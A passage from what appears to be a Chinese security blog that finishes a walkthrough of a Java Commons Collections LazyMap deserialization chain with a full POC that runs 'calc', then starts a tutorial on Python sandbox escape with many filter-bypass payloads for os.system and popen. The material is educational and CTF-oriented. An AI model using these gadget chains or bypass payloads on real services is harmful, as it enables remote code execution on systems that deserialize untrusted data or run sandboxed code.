<p>同样的思路继续向上找哪里调用了get</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718122743403.png"
                      alt="image-20230718122743403"
                ></p>
<p>在很对类中都调用了get方法，我们这条链用的是AnnotationInvocationHandler类中的invoke方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718122921778.png"
                      alt="image-20230718122921778"
                ></p>
<p>这里的memberValues调用了get方法</p>
<p>根据我们上条链分析我们知道这个memberValues的值是可控的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    if (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != 1 ||</span><br><span class="line">        superInterfaces[0] != java.lang.annotation.Annotation.class)</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    this.type = type;</span><br><span class="line">    this.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是我们这里去找readobject调用时没有的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718123411905.png"
                      alt="image-20230718123411905"
                ></p>
<p>可以发现这里并没有调用关系，找到的都是其他类里面的实现方法</p>
<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>但是我们想要实现这条链的利用可以使用动态代理来实现</p>
<p>关于什么是动态代理，可以参考下面两个视频学习：</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1ue411N7GX/?p=2&spm_id_from=pageDriver&vd_source=fc5b727bddb8d056176195c541dcca51" >https://www.bilibili.com/video/BV1ue411N7GX/?p=2&amp;spm_id_from=pageDriver&amp;vd_source=fc5b727bddb8d056176195c541dcca51 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?p=3&vd_source=f775da115bc8ec53ca2933be0602dc26" >https://www.bilibili.com/video/BV16h411z7o9/?p=3&amp;vd_source=f775da115bc8ec53ca2933be0602dc26 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们这里简单的了解一下：</p>
<p><strong>首先什么是代理?</strong></p>
<p>代理是一种设计模式，用于控制对对象的访问。它允许你创建一个代理对象，该对象可以替代原始对象执行某些操作，同时隐藏原始对象的细节。代理对象充当了原始对象的代表，客户端程序将请求发送给代理对象，然后由代理对象将请求传递给原始对象。代理对象可以在传递请求之前或之后执行一些附加操作，例如权限验证、缓存、日志记录、远程调用等。</p>
<p><strong>静态代理：</strong></p>
<p>在程序运行前就已经存在代理类的字节码文件，代理类和被目标类的关系在运行前就确定了</p>
<p><strong>动态代理：</strong></p>
<p>在运行时创建代理对象。动态代理使用Java的反射机制，可以在运行时动态生成代理对象，无需为每个类创建独立的代理类。</p>
<p><strong>如何使用动态代理：</strong></p>
<ol>
<li>通过实现<code>InvovationHandler</code>接口创建自己的调用处理器</li>
<li>通过为<code>Proxy</code>类指定ClassLoader对象和一组Interface来创建动态代理类</li>
<li>通过反射机制获取动态代理类的构造函数，其唯一参数类型是<code>InvocationHandler</code>接口类型</li>
<li>通过构造函数创建动态代理类实例，调用处理器对象（<code>InvocationHandler</code>接口的实现类实例）作为参数传入</li>
</ol>
<h3 id="Poc构造："><a href="#Poc构造：" class="headerlink" title="Poc构造："></a>Poc构造：</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718175625223.png"
                      alt="image-20230718175625223"
                ></p>
<p>AnnotationInvocationHandler类以及实现了InvocationHandler接口，那我们可以使用动态代理去代理LazMap对象，因为动态代理类都需要传入一个实现了InvocationHandler接口的类，并且这个类要重写一个<code>invoke()</code>方法，而当动态代理类的代理对象调用任意方法的时候，就会进入到这个实现了InvocationHandler接口的类中的<code>invoke()</code>方法。</p>
<p>我们如果将这个对象用Proxy进行代理，那么在<code>readObject()</code>的时候，只要调用任意方法，就会进入到 <code>AnnotationInvocationHandler#invoke</code> 方法中，进而触发我们的 <code>LazyMap#get</code> 。</p>
<p>然后我们这里先对对 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 对象进行Proxy：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">      // 反射获取 AnnotationInvocationHandler 构造方法</span><br><span class="line">      Constructor&lt;?&gt; AnnotationInvocationHandlerConstrucor = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">      // 创建对象</span><br><span class="line">      AnnotationInvocationHandlerConstrucor.setAccessible(true);</span><br><span class="line">      InvocationHandler annHandObject = (InvocationHandler) AnnotationInvocationHandlerConstrucor.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line">      // 动态代理 annHandObject</span><br><span class="line">      Map o = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, annHandObject);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>代码这里看到我们代理后的对象是proxyMap，但我们这里不能直接对它进行序列化，因为这里我们的入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject</p>
<p>所以我们这里用AnnotationInvocationHandler对这个proxyMap进行实例化：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object serializableObject = AnnotationInvocationHandlerConstrucor.newInstance(Retention.class, o);</span><br></pre></td></tr></table></figure></div>

<p>那么根据我们上面的分析，我们可以构造出</p>
<h3 id="最终的POC："><a href="#最终的POC：" class="headerlink" title="最终的POC："></a>最终的POC：</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc12 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 恶意代码调用链</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                // 获取 Runtime 对象</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                // 获取 exec 的 Method 对象并调用 invoke 执行 calc</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(new HashMap&lt;&gt;(), chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 反射获取 AnnotationInvocationHandler class 对象</span><br><span class="line">        Class&lt;?&gt; AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        // 反射获取 AnnotationInvocationHandler 构造方法</span><br><span class="line">        Constructor&lt;?&gt; AnnotationInvocationHandlerConstrucor = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        // 创建对象</span><br><span class="line">        AnnotationInvocationHandlerConstrucor.setAccessible(true);</span><br><span class="line">        InvocationHandler annHandObject = (InvocationHandler) AnnotationInvocationHandlerConstrucor.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        // 动态代理 annHandObject</span><br><span class="line">        Map o = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, annHandObject);</span><br><span class="line"></span><br><span class="line">        // 实例化代理对象</span><br><span class="line">        Object serializableObject = AnnotationInvocationHandlerConstrucor.newInstance(Retention.class, o);</span><br><span class="line"></span><br><span class="line">        // 序列化</span><br><span class="line">        serializable(serializableObject);</span><br><span class="line">        // 反序列化</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718194203547.png"
                      alt="image-20230718194203547"
                ></p>
<p>最后在这里贴一张两条链的利用链的流程图做一个总结吧。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718202413139.png"
                      alt="image-20230718202413139"
                >)</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>python沙箱逃逸</title>
    <url>/2023/07/20/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h1><p>在国赛线下赛遇到了python沙箱逃逸的题目，之前在python这块接触的不是很多，这篇文章算是对python沙箱逃逸进行了学习，对着网上师傅的文章进行了复现和学习。文章链接放在文章末了。</p>
<h1 id="一、关于沙箱逃逸"><a href="#一、关于沙箱逃逸" class="headerlink" title="一、关于沙箱逃逸"></a>一、关于沙箱逃逸</h1><p>我们先了解一下什么是沙箱？</p>
<p>沙箱是一种安全机制，用于隔离和限制应用程序或代码的行为。它创建了一个受限的环境，以防止恶意代码对系统造成损害。沙箱通常用于执行不受信任的代码，如浏览器中的JavaScript或其他不受信任的应用程序。它们限制了代码的权限和访问能力，以确保其不能对底层系统或其他应用程序造成危害。</p>
<p>所以说沙箱逃逸就是要突破沙箱，绕过各种过滤和限制，最终可以执行系统任意命令，写文件或者读取文件。</p>
<h1 id="二、如何沙箱逃逸"><a href="#二、如何沙箱逃逸" class="headerlink" title="二、如何沙箱逃逸"></a>二、如何沙箱逃逸</h1><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>我们先了解一下python导入模块的机制：</p>
<p>导入模块时，Python首先检查<code>sys.modules</code>字典，以确定是否已经加载了该模块。<code>sys.modules</code>是一个全局字典，它用于缓存已导入的模块，其中键是模块名，值是对应的模块对象。如果模块已经在<code>sys.modules</code>中，Python会直接使用缓存的模块对象，而不会重新加载该模块</p>
<p>如果模块没有在<code>sys.modules</code>中，则Python会按照一定的顺序在<code>sys.path</code>列表中的目录中查找模块文件。<code>sys.path</code>是一个包含目录路径的列表，用于指定Python解释器在哪些位置查找模块文件。默认情况下，<code>sys.path</code>包括当前目录、Python安装路径、Python标准库路径、以及其他用户定义的路径</p>
<p>找到模块文件后，Python会加载它并执行其中的代码。在执行模块文件时，模块的全局命名空间会被创建，并在其中定义函数、类、变量等。执行完成后，Python会将模块对象添加到<code>sys.modules</code>字典中，以便下次导入时直接使用缓存的模块对象</p>
<p>当使用<code>import a</code>时，只有模块<code>a</code>会添加至<code>sys.modules</code>中，并导入到当前命名空间。但是，如果在<code>a.py</code>中存在<code>import b</code>语句，那么在导入模块<code>a</code>时，Python会先检查<code>b</code>是否已经在<code>sys.modules</code>中，如果已经存在，则直接使用缓存的模块对象。否则，Python会继续按照上述步骤查找并加载<code>b</code>模块。</p>
<p>当使用<code>from x import y</code>时，只有模块<code>x</code>会添加至<code>sys.modules</code>中，并导入到当前命名空间。这里的<code>y</code>是<code>x</code>模块中定义的函数、类、变量等。而不会将<code>y</code>添加至<code>sys.modules</code>中，只有<code>x</code>模块会添加。</p>
<p>下面是我们一一些导入方式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import xxx</span><br><span class="line"></span><br><span class="line">from xxx import *</span><br><span class="line"></span><br><span class="line">__import__(&#x27;xxx&#x27;)</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">sys.modules[&#x27;xxx&#x27;]=&#x27;blacklist&#x27;</span><br><span class="line">del sys.modules[&#x27;xxx&#x27;]</span><br><span class="line">import xxx</span><br><span class="line"></span><br><span class="line">a = open(&#x27;/usr/lib/python3.8/xxx.py&#x27;).read()</span><br><span class="line">exec(a)</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">execfile(&#x27;/usr/lib/python2.7/xxx.py&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>在python命令执行中我们最经常导入的就是os模块</p>
<p>os模块中提供了许多用于处理文件系统，路劲，进程管理登操作的函数</p>
<p>我们经常通过导入os模块进行命令执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(&quot;whoami&quot;)</span><br><span class="line"></span><br><span class="line">#laptop-6degb138\</span><br></pre></td></tr></table></figure></div>

<p>我们这里其实就是调用os模块中的system方法调用操作系统的命令行解释器来执行我们给定的命令</p>
<p>那么最简单沙箱就是直接将import os给禁止了</p>
<p>但是这样的也很好绕过，我们可以通过多加空格的方式绕过</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import  os</span><br><span class="line">import   os</span><br><span class="line">import    os</span><br></pre></td></tr></table></figure></div>

<p>这就是一个简单的沙箱逃逸例子</p>
<p>当然这种情况可以通过把空格也给ban掉、</p>
<p>但是在python中可以进行导入并不是只有import</p>
<p>我们还可以通过<code>__import__</code>、<code>importlib</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;)</span><br><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line">Python中的import语句在代码编写阶段就确定了要导入的模块，而import_module() 允许在代码运行过程中根据需要导入模块。</span><br></pre></td></tr></table></figure></div>

<p>在 Python 中，<code>import</code> 语句的本质就是执行一遍导入的模块（库）。</p>
<p>那么这个过程我们可以通过其他方法来实现</p>
<p><strong>execfile()</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">execfile(filename, globals=None, locals=None)</span><br><span class="line">filename：要执行的外部 Python 文件的文件名。</span><br><span class="line">globals：全局命名空间字典，如果不指定，则使用当前的全局命名空间。</span><br><span class="line">locals：局部命名空间字典，如果不指定，则使用 globals 字典作为局部命名空间。</span><br></pre></td></tr></table></figure></div>

<p>这里使用execfile(）函数可以直接在当前 Python 程序中执行指定的 Python 文件。它会读取文件中的代码，并在当前命名空间中执行这些代码。因此，文件中定义的函数、类、变量等将会在执行后在当前程序中可用</p>
<p>那我们不就可以通过它去实现import导入模块的功能</p>
<p>示例：</p>
<p>my_module.py</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># my_module.py</span><br><span class="line"></span><br><span class="line">def say_hello(name):</span><br><span class="line">    print(f&quot;Hello, &#123;name&#125;!&quot;)</span><br></pre></td></tr></table></figure></div>

<p>main.py</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># main.py</span><br><span class="line"></span><br><span class="line">import my_module</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    name = &quot;John&quot;</span><br><span class="line">    my_module.say_hello(name)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720094745117.png"
                      alt="image-20230720094745117"
                ></p>
<p>当然我们也可以通过这种方法导入os模块</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)</span><br><span class="line">system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720100115779.png"
                      alt="image-20230720100115779"
                ></p>
<p>但是这种方法只能在python2中使用python3中删除了这个函数</p>
<p>但是我们可以通过这种方式来实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import builtins</span><br><span class="line"></span><br><span class="line">def execfile(filename):</span><br><span class="line">    with open(filename, &#x27;r&#x27;) as file:</span><br><span class="line">        code = file.read()</span><br><span class="line">    exec(code, globals())</span><br><span class="line"></span><br><span class="line"># 假设有一个名为 example.py 的文件，内容如下：</span><br><span class="line"># print(&quot;Hello, World!&quot;)</span><br><span class="line"></span><br><span class="line">execfile(&quot;example.py&quot;)  # 在当前命名空间中执行 example.py 文件</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>当然我们也可以通过这种方法导入os模块进行命令执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">with open(&#x27;/usr/lib/python3.11/os.py&#x27;,&#x27;r&#x27;) as f:</span><br><span class="line">    exec(f.read())</span><br><span class="line"></span><br><span class="line">system(&#x27;pwd&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720100721603.png"
                      alt="image-20230720100721603"
                ></p>
<p>这种方法实在python2和python3中都适用的</p>
<p>获取库的路径:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># 获取os模块所在的文件路径</span><br><span class="line">os_module_path = sys.modules[&#x27;os&#x27;].__file__</span><br><span class="line"></span><br><span class="line">print(&quot;os.py 的路径:&quot;, os_module_path)</span><br></pre></td></tr></table></figure></div>

<p>当然这种情况下，sys杯ban了我们还可以使用<code>importlib</code> 模块</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"># 动态导入 os 模块</span><br><span class="line">os_module = importlib.import_module(&#x27;os&#x27;)</span><br><span class="line"></span><br><span class="line"># 获取 os 模块所在的文件路径</span><br><span class="line">os_module_path = os_module.__file__</span><br><span class="line"></span><br><span class="line">print(&quot;os.py 的路径:&quot;, os_module_path)</span><br></pre></td></tr></table></figure></div>

<h2 id="各种过滤"><a href="#各种过滤" class="headerlink" title="各种过滤"></a>各种过滤</h2><h3 id="过滤字符串"><a href="#过滤字符串" class="headerlink" title="过滤字符串"></a>过滤字符串</h3><p>上面是我们关于导入模块的一些手法，在沙箱环境中，为了避免用户执行命令或者其他操作，通常会把一些命令或者命令执行，文件操作函数这些字符串给禁止掉</p>
<p>例如在一些沙箱中，如果匹配到os，会直接不让运行，那么这种情况我们就可以通过变化字符来使用os</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;so&#x27;[::-1]).system(&#x27;dir&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720103821930.png"
                      alt="image-20230720103821930"
                ></p>
<p>这样来通过一个例子来进行演示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">def execute_command(command):</span><br><span class="line">    # 在这里添加限制代码，禁止使用os模块</span><br><span class="line">    if &#x27;os&#x27; in command:</span><br><span class="line">        print(&quot;Sorry, the &#x27;os&#x27; module is not allowed.&quot;)</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            output = eval(command)</span><br><span class="line">            print(&quot;Output:&quot;, output)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&quot;Error:&quot;, e)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print(&quot;Welcome to the command execution challenge!&quot;)</span><br><span class="line">    print(&quot;You can enter any Python expression to execute.&quot;)</span><br><span class="line">    print(&quot;Type &#x27;exit&#x27; to quit.&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        user_input = input(&quot;&gt;&gt;&gt; &quot;)</span><br><span class="line">        if user_input.lower() == &#x27;exit&#x27;:</span><br><span class="line">            break</span><br><span class="line">        execute_command(user_input)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720104027703.png"
                      alt="image-20230720104027703"
                ></p>
<p>可以看到我们成功突破了沙箱的限制</p>
<p>当然我们也可以使用拼接的方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">b = &#x27;o&#x27; </span><br><span class="line">a = &#x27;s&#x27;</span><br><span class="line">__import__(b+a).system(&#x27;ls&#x27;)</span><br><span class="line">即：__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720104348087.png"
                      alt="image-20230720104348087"
                ></p>
<p>当然我们也可以逆序配合eval和exec来使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;[::-1])</span><br><span class="line">exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1])</span><br></pre></td></tr></table></figure></div>

<p>当然这是一些基本的逃逸方式，对于python沙箱逃逸来说，php的字符过滤绕过方式同样适用</p>
<p>逆序，拼接，编码等等这些都可以应用于沙箱逃逸</p>
<p>这里还以os被过滤为例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(base64.b64decode(&#x27;b3M=&#x27;).decode(&#x27;utf-8&#x27;)).system(&#x27;dir&#x27;)</span><br><span class="line">__import__(&#x27;\x6f\x73&#x27;).system(&#x27;dir&#x27;)#16进制编码</span><br><span class="line">__import__(&#x27;\u006f\u0073&#x27;).system(&#x27;dir&#x27;)#unicode编码</span><br><span class="line">__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;dir&#x27;)#拼接</span><br><span class="line">__import__(&#x27;o&#x27;&#x27;s&#x27;).system(&#x27;dir&#x27;)#拼接</span><br><span class="line">__import__(&#x27;o&#x27;.__add__(&#x27;s&#x27;)).system(&#x27;dir&#x27;)#add是字符串的内置方法，用于拼接字符串</span><br><span class="line">__import__(&#x27;%c%c&#x27;% (111,115)).system(&#x27;dir&#x27;)#格式化字符串表示</span><br></pre></td></tr></table></figure></div>

<p>我们通过格式化字符串表示整个paylaod:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(os).system(&#x27;dir&#x27;)</span><br><span class="line">&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#x27; %(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,115,121,115,116,101,109,40,39,100,105,114,39,41)</span><br></pre></td></tr></table></figure></div>

<p>但是这里直接执行时不行的，因为我们这样构造出来的其实是一个字符串形式的代码，所以为了实现字符串 <code>&#39;os.system(&quot;dir&quot;)&#39;</code> 的执行，需要使用 <code>eval()</code> 函数。<code>eval()</code> 函数将字符串作为Python表达式进行解析和执行，并且返回表达式的结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720114616897.png"
                      alt="image-20230720114616897"
                ></p>
<p>那这种方式我们几乎所有的字符串都可以构造</p>
<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h3><p>这就是很常规的过滤了</p>
<p>我们可以将[]用pop或者<code>__getitem__</code>代替</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&#x27;linecache&#x27;).os.popen(&#x27;whoami&#x27;).read()</span><br></pre></td></tr></table></figure></div>

<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p><strong>chr()</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">os.system(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))</span><br></pre></td></tr></table></figure></div>

<p><strong>利用str和[]拼接字符</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">os.system(str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>当然str被过滤，我们可以使用type(‘’)()、format</p>
<p>在 Python 中，<code>type</code> 是一个内置函数，可以用于创建新的类型或查看对象的类型。当 <code>type</code> 函数只传入一个参数时，它会返回该参数的类型。但是，当 <code>type</code> 函数传入三个参数时，它会返回一个新的类型对象，其中第一个参数是类型的名称，第二个参数是基类（继承的父类），第三个参数是一个包含类的属性和方法的字典。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 构造一个空的字符串实例</span><br><span class="line">str_instance = type(&#x27;&#x27;)()</span><br><span class="line"></span><br><span class="line"># 构造一个整数实例</span><br><span class="line">int_instance = type(42)()</span><br><span class="line"></span><br><span class="line"># 构造一个空列表实例</span><br><span class="line">list_instance = type([])()</span><br><span class="line"></span><br><span class="line"># 构造一个自定义类的实例</span><br><span class="line">MyClass = type(&#x27;MyClass&#x27;, (object,), &#123;&#x27;x&#x27;: 10&#125;)</span><br><span class="line">my_instance = MyClass()</span><br><span class="line"></span><br><span class="line"># 输出实例类型</span><br><span class="line">print(type(str_instance))   # &lt;class &#x27;str&#x27;&gt;</span><br><span class="line">print(type(int_instance))   # &lt;class &#x27;int&#x27;&gt;</span><br><span class="line">print(type(list_instance))  # &lt;class &#x27;list&#x27;&gt;</span><br><span class="line">print(type(my_instance))    # &lt;class &#x27;__main__.MyClass&#x27;&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>这个在我们上面过滤字符串就有应用了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(chr(37)+str(&#123;&#125;.__class__)[1])%100 == &#x27;d&#x27;</span><br></pre></td></tr></table></figure></div>

